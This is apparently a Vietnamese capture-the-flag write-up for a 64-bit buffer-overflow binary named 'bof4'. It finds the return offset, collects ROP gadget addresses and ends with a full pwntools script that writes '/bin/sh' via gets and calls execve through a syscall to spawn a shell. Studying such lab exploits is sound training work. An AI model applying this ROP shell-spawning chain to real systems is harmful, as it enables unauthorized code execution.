**1. Tìm lỗi**

Dùng lệnh file để kiểm tra file

![file.png](photo/file.png)

Là file 64-bit nên mở bằng IDA64 ta có hàm main như sau:

![main.png](photo/main.png)

**2. Ý tưởng**

Chương trình không có gì đặc biệt nên dùng ROPgadget để exve

**3. Viết script**

![get.png](photo/get.png)

Khoảng cách từ biến đến ret là: 0x50 + 0x8 = 88

![pop_rdi.png](photo/pop_rdi.png)

Địa chỉ câu lệnh pop rdi: 0x000000000040220e

![pop_rsi.png](photo/pop_rsi.png)

Địa chỉ câu lệnh pop rsi: 0x00000000004015ae

![pop_rdx.png](photo/pop_rdx.png)

Địa chỉ câu lệnh pop rdx: 0x00000000004043e4

![pop_rax.png](photo/pop_rax.png)

Địa chỉ câu lệnh pop rax: 0x0000000000401001

![syscall.png](photo/syscall.png)

Địa chỉ câu lệnh syscall: 0x000000000040132e

![binsh.png](photo/binsh.png)

Không có chuỗi "/bin/sh" nào nên chúng ta phải tìm kiểm địa chỉ có thể lưu vào

![vmmap.png](photo/vmmap.png)

Địa chỉ có thể write được là: 0x00406000

![vmmap1.png](photo/vmmap1.png)

Vị trí còn trống để lưu chuỗi là: 0x406ba0

![gets.png](photo/gets.png)

Địa chỉ hàm gets là: 0x401510

Ta viết được script như sau:

```
from pwn import *

r = process("./bof4")

pop_rdi = 0x000000000040220e
pop_rsi = 0x00000000004015ae
pop_rdx = 0x00000000004043e4
pop_rax = 0x0000000000401001
syscall = 0x000000000040132e
rw_section = 0x406ba0
gets = 0x401510

payload = b'a'*88
payload += p64(pop_rdi) + p64(rw_section)
payload += p64(gets)

payload += p64(pop_rdi) + p64(rw_section)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += b'a'*0x28
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)

r.sendlineafter('something',payload)
r.sendline(b'/bin/sh')
r.interactive()
```